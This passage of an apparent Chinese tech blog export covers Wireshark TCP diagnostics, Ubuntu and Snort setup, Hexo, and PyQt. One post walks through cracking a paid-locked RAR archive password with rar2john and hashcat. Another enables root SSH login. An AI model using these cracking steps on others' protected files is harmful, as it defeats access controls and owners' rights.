Info/Chats菜单，可以看到SYN 的总数量统计。 被误解的TCPQuestion：发出去的TCP包，都应该有对应的ACK确认吗 Answer：TCP 数据接收方可以不必对每一个数据包都做ack确认，数据接收方也可以累积一些包才对发送方 Ack一次。对于ACK的频率，不同的操作系统有不同的频率。因为Ack 是有累积效应的，它隐含了“在此之前的其他包也已收到”的意思。 Question：TCP因为需要进行ack确认，是否效率更低呢 Answer：不会，因为如果TCP发送窗口足够大的话，也可以不受往返时间的约束，源源不断的传送数据。但如果传输小块数据的话，比如能在一个往返时间内就完成的小事，就会因为需要3次握手、4次握手而加大开销，比如DNS查询 最经典的网络问题Question: Nagle算法和延迟确认在一起使用时产生的性能问题，从而导致下载速度变慢。 Answer: ​ 通过wireshark分析一段下载文件的数据包，从中分析出Nagle算法和延迟确认在一起使用时产生的性能问题，从而导致下载速度变慢。 ​ 在某些情况下，应用层传递给TCP 层的数据量很小，比如在SSH 客户端以一般速度打字时，几乎是逐个字节传递到TCP 层的。传输这么少的数据量却要耗费20 字节IP 头+20 字节TCP 头，是非常浪费的，这种情况称为发送方的愚笨窗口综合症，也叫“小包问题”。针对这种小包问题，出现了一种Nagel算法，即将多个数据缓存起来，凑够MSS或等到确认到达之后再发送。 ​ Nagle 和延迟确认本身都没有问题，但一起用就会影响性能。解决方法要么是关闭Nagle算法，要么是关闭延迟确认。 分析过程： Statistics&#x2F;Capture file properties菜单，可以看到网络传输的平均速度等。 Analyze&#x2F;Expert Infos 菜单，可以看到网络传输时出现的错误信息 选定一个包，然后点击Statistics&#x2F;TCP StreamGraph &#x2F;TCP Sequence Graph（Stevens）菜单，可以看到数据传输的速度图。 为什么丢了单子Question: 这章谈论的问题是一个NFS服务器的问题，有些用户属于数十个用户组，有些文件明明允许某个用户组访问的，但是属于该组的用户却访问不了。 Answer: ​ 作者通过wireshark分析出现问题的流量包，通过搜索关键字找到出现问题的数据包，发现其只将16个Group ID传给了服务器，而不是20 个，这些ID 对应着Linux的用户组，这是RFC的限制，也是问题所在。 作者分析的步骤是： 报错是Permission denied，用了Ctrl+F 搜索字符串“denied” 找到了服务器响应的375 号包，定位到了出问题的时间点。不过真正有价值的却是它的上一个包，即来自客户端的374 号包。从中可见RPC（Remote Procedure Call）层只把16 个Group ID 传给服务器，而不是20 个。 这些ID 对应着Linux客户端的/etc/group文件。本地访问之所以没有出问题，是因为不需要调用RPC 层发送用户组。 查了RPC 协议所对应的RFC 5531，找到关于“gids&lt;16&gt;”的定义，发现最多传 16 个用户组是RFC 限制的。 Solution: 解决办法是将客户端的/etc/passwd和/etc/group文件复制到服务器中，需要用到用户组的时候就自己在服务器上查询，完全忽略客户端通过RPC 层传过来的信息。 RPC层：RPC（remote procedure call protocal）远程过程调用协议。通过RPC协议向远程服务器请求服务。属于传输层和应用层。 受损的帧Question：正常情况下，出错的帧不会出现在wireshark里，但为什么会出现呢？ Answer：是wireshark的误报，有时它会出现FCS错误的帧。但实际传输中，是不会有帧检验序列错误的数据包的。因为每个帧在发送前都会被发送方校验一次，然后生成4个字节的FCS存在帧尾。接收方拿到帧之后，又会用相同的算法在做一次校验并生成FCS。假如这次生成的FCS和帧尾携带的不一致，就说明该帧已被损坏，应该被丢弃了。 Wireshark的提示 Packet size limited during capture 当你看到这个提示，说明被标记的那个包没有抓全 TCP Previous segment not captured 在 TCP 传输过程中，同一台主机发出的数据段应该是连续的，如果Wireshark发现后一个包的Seq 号大于前一个包的Seq+Len，就知道中间缺失了一段数据。假如缺失的那段数据在整个网络包中都找不到（即排除了乱序），就会提示该报错。 TCP ACKed unseen segment 当Wireshark 发现被Ack 的那个包没被抓到，就会提示该报错。 TCP Out-of-Order 当Wireshark 发现后一个包的Seq 号小于前一个包的Seq+Len 时，就会认为是乱序了，就会提示该报错。 TCP Dup ACK 当乱序或者丢包发生时，接收方会收到一些Seq 号比期望值大的包。它每收到一个这种包就会Ack 一次期望的Seq 值，以此方式来提醒发送方，于是就产生了一些重复的Ack。Wireshark 会在这种重复的Ack 上标记TCP Dup ACK TCP Fast Retransmission 当发送方收到3 个或以上[TCP Dup ACK]，就意识到之前发的包可能丢了，于是快速重传它 TCP Retransmission 如果一个包真的丢了，又没有后续包可以在接收方触发[Dup Ack]，就不会快速重传。这种情况下发送方只好等到超时了再重传，此类重传包就会被Wireshark标上[TCP Retransmission]。 TCP zerowindow 当Wireshark 在一个包中发现接收窗口为0时，就会给它打上“TCP zerowindow”的标志，表示缓存区已满，不能再接收数据了。 TCP window Full 当Wireshark 在一个包中打上[TCP window Full]标志时，就表示这个包的发送方已经把对方所声明的接收窗口耗尽了。 TCP segment of a reassembled PDU 当你收到这个提示，肯定已经在Edit􀃆Preferences&#x2F;Protocols&#x2F;TCP 菜单里启用了Allow sub dissector to reassemble TCP streams。它表示Wireshark 可以把属于同一个应用层PDU（比如SMB 的Read Response 和Write Request 之类）的TCP包虚拟地集中起来。 Continuation to # 你看到这个提示，说明已经在Edit&#x2F;Preferences&#x2F;Protocols&#x2F;TCP 菜单里关闭了Allow sub dissector to reassemble TCP streams。 Time-to-live exceeded (Fragment reassembly time exceeded 表示这个包的发送方之前收到了一些分片，但是由于某些原因迟迟无法组装起来","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"流量分析","slug":"Web安全/流量分析","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://gryffinbit.top/tags/wireshark/"}],"author":"Gryffinbit"},{"title":"新系统的ubuntu基本配置","slug":"新系统的ubuntu基本配置","date":"2022-07-06T23:12:45.000Z","updated":"2024-11-12T06:59:59.000Z","comments":true,"path":"2022/07/07/新系统的ubuntu基本配置/","permalink":"https://gryffinbit.top/2022/07/07/%E6%96%B0%E7%B3%BB%E7%BB%9F%E7%9A%84ubuntu%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/","excerpt":"","text":"ubuntu 基本配置开启ssh为了操作方便，我更习惯开启ssh，在物理机的terminal操作ubuntu 安装openssh-server软件包 12sudo apt updatesudo apt install openssh-server 验证ssh运行状态 1sudo systemctl status ssh 按q返回到命令行提示符 如果运行状态不为active(running)，需要手动开启 1/etc/init.d/ssh start 修改SSH登陆配置 1sudo vim /etc/ssh/sshd_config 将PermitRootLogin prohibit-password那一行修改为PermitRootLogin yes，去掉前面的#号 将port 22前面的#去掉 检查防火墙 Ubuntu随附了一个名为UFW的防火墙配置工具。如果在系统上启用了防火墙，请确保打开SSH端口。 1sudo ufw allow ssh 重启ssh服务 1sudo systemctl disable --now ssh 1sudo systemctl enable --now ssh 设置SSH连接时长 打开云服务器ssh配置文件： 1vim /etc/ssh/sshd_config 加入如下两个参数保存就可以： 1234TCPKeepAlive yes # 保持TCP连接ClientAliveInterval 600 ClientAliveCountMax 10 重启ssh服务 1service sshd restart 在客户端本地配置 在~./ssh/config里添加 1234# 断开时重试连接的次数 ServerAliveCountMax 5 # 每隔10秒自动发送一个空的请求以保持连接 ServerAliveInterval 10 配置vim可以中文显示1sudo vim /etc/vim/vimrc 在最下面添加代码 1set fencs=utf-8,GB18030,ucs-bom,default,latin1 换源1sudo vim /etc/apt/sources.list 把本来的源注释掉，换成阿里源 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse focal arm64源 由于物理机是基于arm64架构的M1，所以相应的虚拟机也是arm64架构的ubuntu，换源时选用支持arm的源 中科大源（我更喜欢这个，不容易出问题，huawei源总有无法连接的网络问题） 12345678910111213141516deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security multiverse Huawei 源 1wget -O /etc/apt/sources.list https://repo.huaweicloud.com/repository/conf/Ubuntu-Ports-bionic.list 更新软件更新系统软件源 1sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y 网络状况不好时会导致下载文件hash认证失败，可以使用sudo apt-get clean，这将清除/var/lib/apt/lists/*，然后在 sudo apt-get update进行更新 更正时间 1sudo dpkg-reconfigure tzdata 装oh-my-zsh zsh是装到指定的用户下面的。如果安装zsh时是用的普通用户，那就是以普通用户身份运行的时候有zsh，切换到root就没有。 所以切换用户的时候，要给那个用户重新安装 安装git 123sudo apt-add-repository ppa:git-core/ppasudo apt-get updatesudo apt-get install git 查看系统当前shell 1echo $SHELL 查看系统自带哪些shell 1cat /etc/shells 安装zsh 1sudo apt install zsh -y 安装之后 使用 cat /etc/shells 查看系统的shell有 /usr/bin/zsh说明安装成功。 设置zsh为默认shell 1chsh -s /bin/zsh 然后重启 1sudo reboot 需要给不同用户安装zsh时，从这一步开始。字体可以不用再下载一次，（字体这一步可以不再来一次） 安装oh-my-zsh【不能通过ssh执行】 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; 安装curl时出现报错 123The following packages have unmet dependencies: curl : Depends: libcurl4 (= 7.58.0-2ubuntu3.19) but 7.68.0-1ubuntu2.7 is to be installedE: Unable to correct problems, you have held broken packages. 解决方案 12sudo apt-get purge libcurl4sudo apt-get install curl Curl安装成功 配置文件 1vi ~/.zshrc 修改主题 修改这一行ZSH_THEME=&quot;robbyrussell&quot;将主题修改为自己喜欢的 1ZSH_THEME=&quot;agnoster&quot; 重新加载配置文件 1source ~/.zshrc 字体乱码问题 下载最新版本的符号字体和字体配置文件 123wget https://github.com/powerline/powerline/raw/develop/font/PowerlineSymbols.otfwget https://github.com/powerline/powerline/raw/develop/font/10-powerline-symbols.conf 将符号字体移动到一个可用的字体路径 1mv PowerlineSymbols.otf ~/.local/share/fonts/ 更新字体移动到路径的字体缓存 1fc-cache -vf ~/.local/share/fonts/ 安装字体配置文件 1mv 10-powerline-symbols.conf ~/.config/fontconfig/conf.d/ 重启 1reboot 下载插件 自动提示 1git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 语法高亮 1sudo apt install zsh-syntax-highlighting 1echo &quot;source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ~/.zshrc 修改配置文件，生效插件 1vim ~/.zshrc 找到插件位置，添加刚刚的插件 1source ~/.zshrc PS：如果重新打开终端看不到自动提示，可能是终端的字体颜色太淡了，可以通过👇配置把字体改亮一些： 1cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions 修改自动提示相关的配置文件：ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39; 12vi zsh-autosuggestions.zshsource ~/.zshrc *Ubuntu 快速开启 TCP BBR 实现高效单边加速【非必需】Linux Kernel 内核升级到 4.9 及以上版本可以实现 BBR 加速，由于Ubuntu 18.04 默认的内核就是 4.15版本的内核。 由于Ubuntu 20.04 默认的内核就是 5.4 版本的内核，并已经默认编译了 TCP BBR 模块，所以可以直接通过参数开启。新的 TCP 拥塞控制算法 BBR (Bottleneck Bandwidth and RTT) 可以让服务器的带宽尽量跑慢。并且尽量不要有排队的情况，让网络服务更佳稳定和高效。 修改系统变量： 12echo net.core.default_qdisc=fq &gt;&gt; /etc/sysctl.confecho net.ipv4.tcp_congestion_control=bbr &gt;&gt; /etc/sysctl.conf 保存生效 1sysctl -p 执行 1sysctl net.ipv4.tcp_available_congestion_control 如果结果是这样 12sysctl net.ipv4.tcp_available_congestion_controlnet.ipv4.tcp_available_congestion_control = bbr cubic reno 就开启了。执行 lsmod | grep bbr ，以检测 BBR 是否开启。 安装python12345sudo apt-get updatesudo add-apt-repository ppa:deadsnakes/ppasudo apt-get install python3.8# 查看版本 python3.8 --version 安装pip 1sudo apt install python3-pip 修改系统默认版本为python3.8 删除默认的Python3软链接： 1sudo rm /usr/bin/python3 然后创建一个新的软链接指向需要的Python3版本： 1sudo ln -s /usr/bin/python3.8 /usr/bin/python3","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"}],"author":"Gryffinbit"},{"title":"ubuntu【ARM架构】下安装snort【虚拟机版】","slug":"ubuntu下搭建snort【虚拟机版】","date":"2022-07-06T22:07:42.000Z","updated":"2024-11-12T06:59:08.000Z","comments":true,"path":"2022/07/07/ubuntu下搭建snort【虚拟机版】/","permalink":"https://gryffinbit.top/2022/07/07/ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BAsnort%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E3%80%91/","excerpt":"","text":"Tipsubuntu系统配置相关Blog: 新系统的ubuntu基本配置 环境配置Ubuntu: Ubuntu 20.04.2 ARM64 【parallel虚拟机】 macOS: macOS Monterey. M1, 2020, ARM64【物理机】 ubuntu操作用户：在parallels普通用户下进行snort部署 snort版本：snort-2.9.20 ubuntu源：中科大arm源 中科大源 1sudo vim /etc/apt/sources.list 123456789101112131415deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security multiverse 更新系统软件源 1sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y 更正时间 1sudo dpkg-reconfigure tzdata 前言 snort里面有很全的文档，包括snort的安装、使用、插件、嗅探模式如何使用等 snort-2.9.20 新建一个snort文件夹，用于存放snort相关文档。路径/home/parallels/snortFile， 将snort文件夹移至该路径下 安装相关依赖Tips:安装会出现版本依赖报错。用aptitude进行安装，会推荐安装方案，不会在删除包的同时造成重大影响 安装aptitude 需要先在ubuntu里面修改配置，才能顺利安装，找到software&amp;update，勾选 123sudo apt-get updatesudo apt-get install build-essentialsudo apt-get install aptitude 12sudo aptitude install libpcap-devsudo apt-get install libpcap0.8-dev 123sudo apt-get install libdnet-devsudo apt-get install libdumbnet-devsudo apt-get install libdnet 123sudo apt-get install libpcre++0v5sudo apt-get install libpcre3-devsudo apt-get install libpcre++-dev 12sudo apt-get install flexsudo apt-get install bison 1234sudo apt-get install libluajit-5.1-dev sudo apt-get install automakesudo apt-get install libnghttp2-devsudo apt-get install libtool 安装daq数据采集库 daq-2.0.7 将在官网下载的daq文件夹放入snortFile 123456 cd snortFile/daq-2.0.7 aclocal automake --add-missing./configuresudo makesudo make install 1export PATH=$PATH:/usr/local/bin 检查所需依赖是否都安装成功 123which dnet-configwhich pcre-configwhich daq-modules-config 安装snort进入到snort安装包路径 1cd snortFile/snort-2.9.20 编译 123sudo apt upgradesudo apt install libssl1.1=1.1.1f-1ubuntu2sudo aptitude install libssl-dev 123./configure --enable-sourcefiresudo makesudo make install 编译成功 snort安装成功 1sudo snort -v snort配置相关snort配置相关blog见下篇： 配置snort以NIDS模式运行【ubuntu ARM64系统】 参考文章ubuntu arm版本的snort公告 libdpcap官方包解释文档 pkgs.org snort&#x2F;daq安装配置 daqarm64版本","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"ARM架构","slug":"ARM架构","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallels虚拟机","slug":"parallels虚拟机","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"Gryffinbit"},{"title":"hexo安装部署（待完善版本）","slug":"hexo安装部署（待完善版本）","date":"2022-07-05T00:06:47.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/07/05/hexo安装部署（待完善版本）/","permalink":"https://gryffinbit.top/2022/07/05/hexo%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%EF%BC%88%E5%BE%85%E5%AE%8C%E5%96%84%E7%89%88%E6%9C%AC%EF%BC%89/","excerpt":"","text":"前期准备安装npmmac 下 1brew install npm Tip : Mac 安装brew 1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 如果出现443拒绝连接问题，手动下载install.sh到本地，在终端执行。直接将sh脚本拖进终端。 手动下载：https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh 部署hexo下载安装定位到自己的Blog的路径。 注：Blog是我自己的命名，全文安装时，更改成自己的blog名字及路径 1cd Blog 1npm install -g hexo-cli 初始化1hexo init Blog ![Screen Shot 2021-04-22 at 3.17.45 PM](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2021-04-22 at 3.17.45 PM.png)初始化完成后 1npm install 执行完成后会生成一些配置文件 1config.yml //网站的配置信息，您可以在此配置大部分的参数。 12package.json _drafts _posts 1source //资源文件夹是存放用户资源的地方。 1scaffolds //模版文件夹。当新建文章时，Hexo 会根据 scaffold 来建立文件。 1themes //主题文件夹。Hexo会根据主题来生成静态页面 开始建立blog新建一篇文章（我的第一篇文章） 1hexo new &quot;我的第一篇文章&quot; 会在&#x2F;source&#x2F;_post里自动生成了“我的第一篇文章.md”文件，之后新建的文章都将存放在此目录下。编辑“我的第一篇文章.md”文件可修改内容。 生成网站 1hexo generate (可简写成 hexo g) 启动本地服务器 可以用于在本地上进行查看、修改，最后再部署上去 1hexo server (可简写成 hexo s) 在浏览器输入http://localhost:4000 即可查看网站。 部署到GitHub将blog部署到Github Pages 上，使用hexo deploy部署 hexo deploy部署找到blog目录下的配置文件_config.yml,用编辑器打开此文件 找到此文件中的deploy字段，按照以下配置 12345deploy: type: git repository: https://github.com/Gryffinbit/gryffinbit.github.io //自己的github项目链接 branch: master 安装扩展 12npm install hexo-deployer-git --save 123. 设置用户名 git config --global user.email &quot;you@example.com&quot; git config --global user.name &quot;Your Name&quot; 12345 4. 部署hexo deploy","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://gryffinbit.top/tags/hexo/"}],"author":"Gryffinbit"},{"title":"hashcat爆破rar","slug":"hashcat爆破rar","date":"2022-07-02T18:09:41.000Z","updated":"2024-11-12T06:59:41.000Z","comments":true,"path":"2022/07/03/hashcat爆破rar/","permalink":"https://gryffinbit.top/2022/07/03/hashcat%E7%88%86%E7%A0%B4rar/","excerpt":"","text":"今天下载美剧，下载了压缩包之后，发现竟然加密了，要扫二维码收费才可以解锁。so，那不能惯着他，于是上了hashcat进行压缩包的爆破 实验环境压缩包格式为 rar 电脑系统为：macOS Monterey。M1，2020 hashcathttps://hashcat.net/hashcat/ World’s fastest password cracker World’s first and only in-kernel rule engine 总之hashcat是一个很好用的爆破工具 在官网上把资源包下载，编译运行 1make 把hashcat加入到路径 1vim ~/.zshrc 1export PATH=&quot;&lt;path&gt;:$PATH&quot; Path中填入hashcat这个文件夹所在路径。这样下次使用的时候，就不需要把hashcat的运行文件路径填入，只需要输入hashcat就可以用了。 1source ~/.zshrc 使文件生效 john-jumbo爆破之前，需要先获取rar密码的hash，需要用到工具john-humbo 1brew install john-jumbo 同理，将john加入到路径。 1vim ~/.zshrc 1export PATH=&quot;/opt/homebrew/Cellar/john-jumbo/1.9.0/share/john:$PATH&quot; 1source ~/.zshrc 在shell中输入 1rar2john &lt;rar文件路径&gt; 将hash保存为文件test.hash 爆破1hashcat -m 13000 -a 0 test.hash example.dict -D2 -m参数是根据rar类型进行选择的，这里是RAR5 -a参数是攻击模式，“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。 test.hash是保存的hash值 example.dict 是hashcat自带的字典 这里的-D2是因为正常运行的时候，在m1芯片上会报错，显示没有设备可用，这时候就可以强制指定设备 选择设备后 最终显示密码的时候，使用–show参数，将最终密码展示 1hashcat -m 13000 -a 0 test.hash example.dict -D2 --show 爆破成功，密码aaa123456. 下次建议想骗钱的话，就别用弱密码了[手动狗头] 番外实际上，我用m1的时候，开始报错很多，我去hashcat的pullrequest 里面翻，找到了一个大佬专门为m1芯片的各个问题，写了新的版本，没有成为正式发布的版本，但是非常好用，我最后爆破成功用的就是他写的版本。 这是issue的链接，有兴趣的可以自己翻翻看，找到自己对应的问题. M1 No device found&#x2F;left 大佬给出的m1最终修订版. apple_m1_final 实际上我自己在用的版本 apple_m07500_native_threads 还有很多其他的branches","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"hashcat","slug":"hashcat","permalink":"https://gryffinbit.top/tags/hashcat/"}],"author":"Gryffinbit"},{"title":"snort的工作模式","slug":"snort的工作模式","date":"2022-06-27T16:43:33.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/06/28/snort的工作模式/","permalink":"https://gryffinbit.top/2022/06/28/snort%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"工作模式 snort有三种工作模式：嗅探器模式、数据包记录器模式、 网络入侵检测模式 嗅探器模式 sniffer mode从网络中抓取数据包 数据包嗅探器有以下几种用途： 网络分析和网络故障查找 网络性能和负荷量分析 监听明文传输的用户名密码等敏感数据 数据包记录器模式 packet logger mode将数据包记录到硬盘中 嗅探器模式得到的输出信息都显示在屏幕上，如果要把这些数据信息记录到硬盘上并制定到一个目录中，就需要数据包记录器。 可以抓到数据链路层、TCP&#x2F;IP报头、应用层的数据。 文件保存格式是二进制保存。 网络入侵检测模式 network intrusion detection system mode分析网络中传输的数据并与入侵规则库相匹配来发现入侵行为。 如果将snort用作长期检测，那么日志会越来越多，占用空间越来越大。所以可以设置IDS模式，将网络报警信息记录到log 报警模式 当捕获的包与规则匹配，snort可以以多种模式报警。当满足了一条报警条件时，snort中的报警将做两件事： 向报警工具输出一个事件 以配置好的日志模式记录尽可能多的或需要的信息 报警机制 fast：最常用的模式，报警信息包括一个时间戳、报警消息、源&#x2F;目的IP地址和端口【在大规模高速网络中最好使用fast模式】 full：默认的报警模式【适用于低带宽网络】 unsock：把报警通过unix套接字发送到一个监听程序，这样可以实现实时报警 none：将snort报警完全关闭【在高速网络环境应用统一日志的情况下很有用，可以在统一日志的时候关闭普通日志选项】 syslog：使snort把报警消息发送到syslog。可以通过snort.conf文件修改其配置【是产生系统事件日志的守护进程】","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"snort定义和使用变量","slug":"snort配置文件（定义、使用变量）","date":"2022-06-26T18:52:43.000Z","updated":"2024-11-12T06:59:19.000Z","comments":true,"path":"2022/06/27/snort配置文件（定义、使用变量）/","permalink":"https://gryffinbit.top/2022/06/27/snort%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%88%E5%AE%9A%E4%B9%89%E3%80%81%E4%BD%BF%E7%94%A8%E5%8F%98%E9%87%8F%EF%BC%89/","excerpt":"","text":"snort定义和使用变量定义普通变量： 1var &lt;变量名&gt;&lt;变量值&gt; 例如 1var HOME_NET 192.168.1.0/24 引用变量时，在规则中用 $引用该变量 在变量中使用变量值列表，定义一个包含多个条目的变量，不同的条目用逗号分隔。 例如一个包含两个网段的网络 var HOME_NET [192.168.1.0/24,192.168.10.0/24] 定义变量的时候，可以用网络接口名称 1var HOME_NET $ eth0_ADDRESS 定义变量的时候，可以用动态变量。即在配置文件或附加包含文件中用已定义了的变量再去定义其他变量。 例如，定义了一个变量DMZ_WEB 1var EXTERNAL_WEB $ DMZ_WEB 关键字any也可以成为一个变量，能匹配任何之 1var ECTERNAL_NET any 如果被引用的变量没有定义或定义非法，动态变量可以被赋予一个默认静态地址，也可以定义一段错误提示信息，当被引用变量为定义时将显示该信息。 12var &lt;变量名&gt;$&lt;被引用变量：默认静态地址&gt;var &lt;变量名&gt;$&lt;被引用变量：? 错误提示信息&gt; “变量值”部分被冒号分开，冒号前面是被引用变量，当被引用变量未定义时，引擎将根据冒号后面的部分执行动作 例如：下面的规则定义了一个动态的单一IP地址，变量DNS_SERVER等于变量ORG_DNS_SERVER，如果ORGD_DNS_SERVER没有定义，DNS_SERVR赋值为10.1.1.2 1var DNS_SERVER $ (ORG_DNS_SERVER:10.1.1.2) 当被引用变量未定义时系统将打印错误信息 1var ENTIRE_INTERNAL_COMPANY $ (INTERNAL_NETS:?错误) 配置项的灵活应用 snort.conf 文件中用配置指令可以让用户配置snort的全局设定，如日志文件的路径，规则的应用顺序等。配置项语法格式由配置对象的标识字段和参数值组成 1config&lt;指令名&gt;:&lt;参数值&gt; config变量说明该配置项的类型，“指令名”用来说明参数值将被应用的对象。“N”表示该指令不需要附加参数 配置文件中的其他关键要素 预处理器配置 1preprocessor&lt;预处理器名&gt;[:&lt;配置选项&gt;] 输出模块配置 1output&lt;输出模块名&gt;[:&lt;配置选项&gt;] 规则和包括文件配置 1include规则文件路径/规则文件名 命令行参数1snort[-option]&lt;filter options&gt; -o参数 snort的规则分为3大类，报警规则、通过规则、日志规则。当snrot收到包的时候会按照 alert -&gt;pass -&gt; log 顺序一次检验，这样可以保证安全性。但是因为大多数包是正常包，所以这样会耗费一些系统资源。 snort提供一种方法改变顺序来提高效率，但是会降低安全性。将顺序改为 pass-&gt;alert-&gt;log","categories":[{"name":"入侵检测","slug":"入侵检测","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"入侵检测/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"pyQt开发中遇到的一些小坑-macOS M1","slug":"pyQt开发中遇到的一些小坑-macOS-M1","date":"2022-04-13T11:46:17.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/04/13/pyQt开发中遇到的一些小坑-macOS-M1/","permalink":"https://gryffinbit.top/2022/04/13/pyQt%E5%BC%80%E5%8F%91%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%9D%91-macOS-M1/","excerpt":"","text":"PyQt里面keyPressEvent的相关问题在macOS系统里controlModifier对应的是command，MetaModifier对应的是ctrl 123456class MyLabel(QLabel): def keyPressEvent(self, evt): print(&quot;点击了键盘&quot;) # 用以测试这种方法是否被正常调用 # 组合键 if evt.modifiers() == Qt.ControlModifier &amp; evt.key() == Qt.Key_W: print(&quot;点击了command+W 退出窗口&quot;) 三个组合键，使用或运算 12345if evt.modifiers() == Qt.MetaModifier | Qt.ShiftModifier and evt.key() == Qt.Key_R : print(&quot;ctrl+Shfit+R 运行&quot;)# 两个修饰键if evt.modifiers() == Qt.MetaModifier | Qt.ShiftModifier: print(&quot;两个修饰键一起运行&quot;) 键的名称command对应Ctrl Ctrl对应Meta 设置快捷键的时候有用 